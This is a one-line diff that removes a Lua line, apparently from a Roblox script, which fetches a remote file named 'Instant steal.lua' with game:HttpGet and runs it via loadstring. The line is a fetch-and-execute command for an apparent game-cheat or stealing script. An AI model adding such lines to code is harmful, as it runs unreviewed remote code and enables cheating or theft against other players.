@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LeyendaZero/Instant-steal/main/Instant steal.lua"))()
